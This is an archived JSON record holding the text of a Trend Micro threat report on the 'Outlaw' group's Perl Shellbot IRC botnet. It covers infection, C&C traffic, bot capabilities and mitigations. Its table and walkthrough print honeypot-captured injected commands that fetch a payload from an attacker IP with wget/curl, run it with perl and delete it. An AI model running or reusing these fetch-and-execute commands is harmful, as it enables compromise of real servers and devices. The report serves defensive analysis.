{
    "id": "b493bbf4-4a17-4297-a605-2f7d623c6aa6",
    "created_at": "2022-10-25T16:48:23.570891Z",
    "updated_at": "2025-03-27T02:05:28.166522Z",
    "deleted_at": null,
    "sha1_hash": "e484a67cc8eea37971aca97bbd9b4a82f33d6867",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-05-12T02:12:52Z",
    "file_modification_date": "2020-05-12T02:12:52Z",
    "file_size": 2303382,
    "plain_text": "[Trend Micro](https://www.trendmicro.com/)\n[About TrendLabs Security Intelligence Blog](https://blog.trendmicro.com/trendlabs-security-intelligence/about-us/)\n\nSearch:\n\nGo to…\n\n[Home](http://blog.trendmicro.com/trendlabs-security-intelligence/)\nCategories\n\n[Home  »  Botnets  »  Perl-Based Shellbot Looks to Target Organizations via C&C](https://blog.trendmicro.com/trendlabs-security-intelligence/)\n\n# Perl-Based Shellbot Looks to Target Organizations via C&C\n\n[Posted on:November 1, 2018 at 12:04 am](https://blog.trendmicro.com/trendlabs-security-intelligence/2018/11/)\n[Posted in:Botnets, Internet of Things, Malware](https://blog.trendmicro.com/trendlabs-security-intelligence/category/botnets/)\nAuthor:\n[Trend Micro Cyber Safety Solutions Team](https://blog.trendmicro.com/trendlabs-security-intelligence/author/cybersafety/)\n\n0\n\nWe uncovered an operation of a hacking group, which we’re naming “Outlaw” (translation derived from the\nRomanian word haiduc, the hacking tool the group primarily uses), involving the use of an IRC bot built with\nthe help of Perl Shellbot. The group distributes the bot by exploiting a common command injection\n[vulnerability on internet of things (IoT) devices and Linux servers. Further research indicates that the threat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000117)\ncan also affect Windows-based environments and even Android devices.\n\n\nGo to…\n\n\n-----\n\ninstitution, as well as a Bangladeshi government site over [a vulnerability on Dovecot mail server. They then](http://www.securiteam.com/unixfocus/6H00L0UHFC.html)\nused two compromised servers and linked them to a high availability cluster to host an IRC bouncer, which\nwas used to command and control the emerging botnet.\n\nAside from finding several exploit files that allowed us to understand how the initial exploit on the first server\nworked, we also found configuration files of the [hackers’ toolset that allowed them to target organizations](https://documents.trendmicro.com/assets/Perl-Based_Shellbot_Looks_to_Target_Organizations_via_C&C_appendix.pdf)\nthrough DoS and SSH brute force, using so-called “class files.” Moreover, this suggests that the threat actors\nwere building a botnet that can be used for cybercriminal purposes.\n\nThe operation particularly caught our attention after various sensors of our honeypots started to capture new\ninjected commands:\n\n**Source** **Command**\n\n\n107.1.153.75\n\n195.154.43.102\n\n218.25.74.221\n\n61.8.73.166\n\n61.8.73.166\n\n69.64.62.159\n\n\n_uname -a; wget hxxp://54[.]37[.]72[.]170/n3;_\n_curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;_\n_rm -rf n3; rm -rf n3.*_\n\n_uname -a; wget_\n_ftp://museum:museum04@153[.]122[.]156[.]2_\n_32/Mail/n3; rm -rf n3; rm -rf n3.*_\n\n_uname -a; wget hxxp://54[.]37[.]72[.]170/n3;_\n_curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;_\n_rm -rf n3; rm -rf n3.*_\n\n_uname -a; wget hxxp://54[.]37[.]72[.]170/n3;_\n_curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;_\n_rm -rf n3; rm -rf n3.*_\n\n_uname -a; wget hxxp://54[.]37[.]72[.]170/n3;_\n_curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;_\n_rm -rf n3; rm -rf n3.*;wget_\n_hxxp://54[.]37[.]72[.]170/n.tgz;tar -xzvf_\n_n.tgz;rm -rf n.tgz;cd .s;./run;cd /tmp_\n\n_uname -a;cd /tmp;wget_\n_hxxp://54[.]37[.]72[.]170/n3;perl n3;rm -rf_\n_n3*_\n\n\n_Table 1. Commands we identified_\n_Note: Source – Source IP address which tried to inject the command;_\n\n_Command – Command as captured by the honeypot sensor utility_\n\n**Country**\nTaiwan\nJapan\nUnited States\nIndia\nUnited Kingdom\nIsrael\nKuwait\nBrazil\nColombia\nGermany\nSwitzerland\nThailand\nBulgaria\nGreece\nItaly\nMalaysia\n\n\n-----\n\n_(based on Trend Micro Smart Protection Network feedback)_\n\nThe botnet itself is built with a Shellbot variant with script written in Perl and even available on GitHub. The\nbotnet was previously distributed via an exploit of the [Shellshock vulnerability, hence the name “Shellbot.”](https://blog.trendmicro.com/trendlabs-security-intelligence/one-year-after-shellshock-are-your-servers-and-devices-safer/)\nThis time, the threat actors mostly distribute it via previously brute-forced or compromised hosts.\n\nIn order to look into the threat’s behavior, we looked into our honeypots with several hosts:\n\nHost #1: The Ubuntu 16.04 based host with Splunk forwarder for monitoring\nHost #2: The Ubuntu 16.04 server with Dovecot mail server installed\nHost #3: An Android device running Android 7, [one of the most popular versions and can be easily](https://developer.android.com/about/dashboards/)\nrooted\n\nWe then monitored the C&C traffic and obtained the IRC channels’ information. By the first infection, around\n142 hosts were present in the IRC channel.\n\n### How it infects systems\n\nA command is first run on the IoT device or server. In this example, the command “uname -a;cd /tmp;wget\n_hxxp://54[.]37[.]72[.]170/n3;perl n3;rm -rf n3*” verifies that the host accepts commands from the_\ncommand-line interface (CLI) with “uname -a“. Once the command runs successfully, the working directory\nis changed to “/tmp“. The downloaded payload, n3 file (detected by Trend Micro as [PERL_SHELLBOT.SM),](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/perl_shellbot.sm)\nis then consequently run with perl interpreter. In the final step of the chain, the n3 file is removed, with no\ntrace of activity left on the attacked system.\n\n_Figure 1. Actual payload, with filename n3_\n\nOnce the bot is installed, it starts to communicate with one of the C&C servers via IRC.\n\n_Figure 2. The bot runs as “/usr/sbin/httpd”_\n\n_Figure 3. Outgoing connection to one of the C&C servers, luci[.]madweb[.]ro_\n\nThe C&C connection attempt occurs right after the infection and is persistent. In case of lost connectivity, it\nimmediately reconnects once an internet connection is available. At this stage, restarting the infected machine\n\n\n-----\n\nhosts. Reconstructed Transmission Control Protocol (TCP) streams show in clear text the download of the\nmalicious file and subsequent communication with the C&C servers.\n\n### Captured network traffic during the infection\n\nA TCP stream from traffic capture between the infected host and C&C server at the time of the infection\nbelow shows that the n3 file was consequently downloaded and run on the target system.\n\n_Figure 4. TCP stream from network traffic between the infected host and C&C server_\n\n_Figure 5. TCP communication stream after the infection_\n\nAfter the infection, the communication shows that it joined the bot’s IRC channel and assigned nickname and\nserver configuration information. Modifying Domain Name System (DNS) settings should show and confirm\nthat a real target is involved (not just the honeypot) and that it has visibility to the internet. It also shows the\nnumber of processor cores and the type of processor. It also discloses that the Splunk is running on the host\nby using the command “cat /etc/passwd/” with filtered output. This is to notify the admins that the target\ndevice is being monitored or if it has an antivirus (AV) solution installed.\n\nIt is followed by PING/PONG communication (where the IRC server occasionally sends a PING message,\nwhich requires the response of a PONG message to prevent getting disconnected) to keep the communication\nchannel open.\n\n\n-----\n\n_Figure 6. Separate information are sent to IRC admins_\n\nThere is a list of hardcoded process names Shellbot is assigned when run. These help hide the running bot\nfrom system admins, security monitoring, and researchers.\n\n_Figure 7. Screenshot from Shellbot’s configuration file with the available process names_\n\nOnce the Shellbot is running on a target system, the administrator of the IRC channel can send various\ncommands to the host. The list includes commands to perform a port scan, perform various forms of\ndistributed denial of service (DDoS), download a file, get information about other machines, or just send the\noperating system (OS) information and list of certain running processes on the C&C server.\n\n### Possible script functions an IRC command can call\n\n\n-----\n\n_Figure 8. Screenshot of script header with list of available commands_\n\nSome of the IRC-related [functions seen to have been used were join, part, uejoin, op, deop, voice, devoice,](https://gist.github.com/xero/2d6e4b061b4ecbeb9f99)\n_nick, msg, quit, uaw, and die. DDoS-related activity affects User Data Protocol (UDP), TCP, and HTTP_\ntraffic.\n\nIf a port scan is invoked, the bot always scans the following ports:\n\n**Ports**\n1 7 9 14 20 21 22 23 25 53\n80 88 110 112 113 137 143 145 222 333\n405 443 444 445 512 587 616 666 993 995\n1024 1025 1080 1144 1156 1222 1230 1337 1348 1628\n1641 1720 1723 1763 1983 1984 1985 1987 1988 1990\n1994 2005 2020 2121 2200 2222 2223 2345 2360 2500\n2727 3130 3128 3137 3129 3303 3306 3333 3389 4000\n4001 4471 4877 5252 5522 5553 5554 5642 5777 5800\n5801 5900 5901 6062 6550 6522 6600 6622 6662 6665\n6666 6667 6969 7000 7979 8008 8080 8081 8082 8181\n8246 8443 8520 8787 8855 8880 8989 9855 9865 9997\n9999 10000 10001 10010 10222 11170 11306 11444 12241 12312\n14534 14568 15951 17272 19635 19906 19900 20000 21412 21443\n21205 22022 30999 31336 31337 32768 33180 35651 36666 37998\n41114 41215 44544 45055 45555 45678 51114 51247 51234 55066\n55555 65114 65156 65120 65410 65500 65501 65523 65533\n\n_Table 3. Ports scanned by the bot_\n\n### Sample of network communication captured on infected hosts\n\nThis network communication seems to be the output of an [XMR rig mining monitoring tool.](https://forums.servethehome.com/index.php?threads/sth-xmrig-monero-mining-docker-image.17049/page-2)\n\nCode of the tool:\n\n_root@ubuntu:~$ cat speed.sh_\n_i=1_\n_result=`docker ps -q | wc -l`_\n_while [ “$i” -le “$result” ]_\n_do_\n_echo “miner numa $i speed”_\n\n\n-----\n\n_rm /tmp/minernuma$i.tmp_\n_i=$(($i + 1))_\n_done_\n\n### Reconstructed TCP streams from the traffic capture of C&C commands\n\nThe infected host always gets assigned a nickname of “sEx” along with a randomly generated integer. In this\nexample, the host nickname is “sEx-3635”.\n\n_Figure 9. TCP stream with a sample host nickname_\n\nAll infected hosts also showed base C&C connection in the form of PING/PONG traffic, occasionally asked\nfor updates, and provided some host information like suspicious crontab-like records and process identifier\n(PID) of the sd-pam process of the user who was running the IRC bot on the system. The following is the\ninformation exchange about a host, possibly the bot’s new joiner or another target indirectly scanned over the\nzombie hosts, the infected host in this case:\n\n\n-----\n\n_Figure 10. Host information exchange TCP stream_\n\n_Figure 11. One of the spotted identities linked to compromised servers_\n\nDuring the traffic monitoring, several identities such as luci, lucian, dragos, mazy, hydra, and poseidon were\nspotted in IRC communication channels.\n\nThese identities were also found as usernames on a compromised Japanese server This server seemed to have\n\n\n-----\n\nthe following example:\n\n_Figure 12. Dragos SSH login_\n\nUsing the credentials from one of the commands injected into the honeypots, we were able to get downloads\nof the files that the threat actors used. The files’ contents often changed on the server (some were deleted,\nwhile some were added). According to the time correlation, it mostly happened in the daytime (in Central\nEuropean Time/CET): during business hours and times. The activity never happened at night or on the\nweekends, suggesting that the threat actors operated on a somewhat daily basis.\n\nFind a more extensive run-through of this operation, such as how the IRC bouncer involved comments in the\nRomanian language, the hacking tools used, exploits related to Ubuntu, and the indicators of compromise\n(IoCs), in the **_[Appendix.](https://documents.trendmicro.com/assets/Perl-Based_Shellbot_Looks_to_Target_Organizations_via_C&C_appendix.pdf)_**\n\n### Preventing compromise from malicious bot-related activities\n\nThe Outlaw group here used an IRC bot, which isn’t a novel threat. The code used is available online, making\nit possible to build such a bot (with a fully undetectable toolset) and operate it under the radar of common\nnetwork security solutions. Additionally, in this particular operation, it should be noted that the attackers\nlooked into targeting big companies. While we haven’t seen widespread attacks from this hacking group, it is\nimportant to adopt security measures that can defend systems against any potential attacks, such as:\n\nSetting up the SSH login process properly. Do not leave it open to public networks unless it is\nnecessary for your infrastructure. Many devices run an SSH service by default, unnecessarily, with\ndefault credentials. This is particularly true in the case of network infrastructure devices like switches\nand firewalls.\nMonitoring the commands used on CLI on your systems.\nMonitoring non-DNS traffic coming to and from port 53.\nDetecting creation of new accounts and regularly verifying that all created accounts are only used for\nbusiness purposes.\nRestricting the use of FTP as much as possible. Not only does it transfer passwords in clear text, but is\nalso usually used for loading the exploit files on local systems. The same goes for the web directories.\nAny newly created files should be considered suspicious unless they are in an intended folder in the\nsystem.\nReconsidering the use of Dovecot mail server, as it has been found to have a buffer overflow\nvulnerability (and therefore unsecure). Patch it or at least monitor its file directory for unusual files.\nMaintaining a mailbox, a contact person, or at least a contact form on your website for reporting any\npossible abuse or security compromise.\n\nUsers can also consider adopting security solutions that can provide protection from malicious bot-related\nactivities through a cross-generational blend of threat defense techniques. [Trend Micro™ XGen™ security](https://www.trendmicro.com/en_us/business/products/all-solutions.html)\nprovides high-fidelity machine learning that can secure the [gateway and](https://www.trendmicro.com/en_us/business/products/user-protection/sps.html) [endpoints, and protect physical,](https://www.trendmicro.com/en_us/business/products/user-protection/sps.html)\nvirtual, and cloud workloads. With technologies that employ web/URL filtering, behavioral analysis, and\ncustom sandboxing, XGen security offers protection against ever-changing threats that bypass traditional\ncontrols and exploit known and unknown vulnerabilities. XGen security also powers Trend Micro’s suite of\nsecurity solutions: [Hybrid Cloud Security, User Protection, and](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-security.html) [Network Defense.](https://www.trendmicro.com/en_us/business/products/network.html)\n\n## Related Posts:\n\n**[Keeping a Hidden Identity: Mirai C&Cs in Tor Network](https://blog.trendmicro.com/trendlabs-security-intelligence/keeping-a-hidden-identity-mirai-ccs-in-tor-network/)**\n\n\n-----\n\nLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:\n\n[ENTERPRISE](http://www.trendmicro.com/us/security-intelligence/enterprise-ransomware/index.html) » [SMALL BUSINESS](http://www.trendmicro.com/us/security-intelligence/small-business-ransomware/index.html) » [HOME](http://www.trendmicro.com/us/home/consumer-ransomware/index.html) »\n\n\nTags: [androidIOTIRC botLinuxWindows](https://blog.trendmicro.com/trendlabs-security-intelligence/tag/android/)\n\n### Security Predictions for 2020\n\nCybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations and\ncybercriminal arsenal to technological developments and global threat intelligence — only so\ndefenders can keep up with the broad range of threats.\n[Read our security predictions for 2020.](https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2020)\n\n### Business Process Compromise\n\nAttackers are starting to invest in long-term operations that target specific processes enterprises rely on.\nThey scout for vulnerable practices, susceptible systems and operational loopholes that they can\nleverage or abuse. To learn more, [read our Security 101: Business Process Compromise.](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-business-process-compromise)\n\n### Recent Posts\n\n[New MacOS Dacls RAT Backdoor Show Lazarus’ Multi-Platform Attack Capability](https://blog.trendmicro.com/trendlabs-security-intelligence/new-macos-dacls-rat-backdoor-show-lazarus-multi-platform-attack-capability/)\n[Targeted Ransomware Attack Hits Taiwanese Organizations](https://blog.trendmicro.com/trendlabs-security-intelligence/targeted-ransomware-attack-hits-taiwanese-organizations/)\n[WebMonitor RAT Bundled with Zoom Installer](https://blog.trendmicro.com/trendlabs-security-intelligence/webmonitor-rat-bundled-with-zoom-installer/)\n[Exposed Redis Instances Abused for Remote Code Execution, Cryptocurrency Mining](https://blog.trendmicro.com/trendlabs-security-intelligence/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining/)\n[Grouping Linux IoT Malware Samples With Trend Micro ELF Hash](https://blog.trendmicro.com/trendlabs-security-intelligence/grouping-linux-iot-malware-samples-with-trend-micro-elf-hash/)\n\n### Popular Posts\n\n[WebMonitor RAT Bundled with Zoom Installer](https://blog.trendmicro.com/trendlabs-security-intelligence/webmonitor-rat-bundled-with-zoom-installer/)\n\n[New MacOS Dacls RAT Backdoor Show Lazarus’ Multi-Platform Attack Capability](https://blog.trendmicro.com/trendlabs-security-intelligence/new-macos-dacls-rat-backdoor-show-lazarus-multi-platform-attack-capability/)\n\n[Exposing Modular Adware: How DealPly, IsErIk, and ManageX Persist in Systems](https://blog.trendmicro.com/trendlabs-security-intelligence/exposing-modular-adware-how-dealply-iserik-and-managex-persist-in-systems/)\n\n[Coronavirus Update App Leads to Project Spy Android and iOS Spyware](https://blog.trendmicro.com/trendlabs-security-intelligence/coronavirus-update-app-leads-to-project-spy-android-and-ios-spyware/)\n\n[Dissecting Geost: Exposing the Anatomy of the Android Trojan Targeting Russian Banks](https://blog.trendmicro.com/trendlabs-security-intelligence/dissecting-geost-exposing-the-anatomy-of-the-android-trojan-targeting-russian-banks/)\n\n\n-----\n\nYour email here\n\n\n[Home and Home Office](http://www.trendmicro.com/us/home/index.html)\n|\n[For Business](http://www.trendmicro.com/us/business/index.html)\n|\n[Security Intelligence](http://www.trendmicro.com/us/security-intelligence/index.html)\n|\n[About Trend Micro](http://www.trendmicro.com/us/about-us/index.html)\n\n[Asia Pacific Region (APAC): Australia /](http://www.trendmicro.com.au/au/home/index.html) [New Zealand, 中国, ⽇本, 대한민국, 台灣](http://www.trendmicro.co.nz/nz/home/index.html)\nLatin America Region (LAR): [Brasil, México](http://br.trendmicro.com/br/home/index.html)\nNorth America Region (NABU): [United States, Canada](http://www.trendmicro.com/us/index.html)\nEurope, Middle East, & Africa Region (EMEA): [France, Deutschland / Österreich / Schweiz, Italia,](http://www.trendmicro.fr/)\n[Россия, España, United Kingdom / Ireland](http://www.trendmicro.com.ru/)\n\n[Privacy Statement](http://www.trendmicro.com/us/about-us/legal-policies/privacy-statement/index.html)\n[Legal Policies](http://www.trendmicro.com/us/about-us/legal-policies/index.html)\n\nCopyright © 2020 Trend Micro Incorporated. All rights reserved.\n\n\nYour email here\n\nSubscribe\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.11.01_Outlaw_group/Perl-Based%20Shellbot%20Looks%20to%20Target%20Organizations%20via%20C%26C%20-%20TrendLabs%20Security%20Intelligence%20Blog.pdf"
    ],
    "report_names": [
        "Perl-Based Shellbot Looks to Target Organizations via C&C - TrendLabs Security Intelligence Blog"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041128,
    "ts_creation_date": 1589249572,
    "ts_modification_date": 1589249572,
    "files": {
        "pdf": "https://archive.orkl.eu/e484a67cc8eea37971aca97bbd9b4a82f33d6867.pdf",
        "text": "https://archive.orkl.eu/e484a67cc8eea37971aca97bbd9b4a82f33d6867.txt",
        "img": "https://archive.orkl.eu/e484a67cc8eea37971aca97bbd9b4a82f33d6867.jpg"
    }
}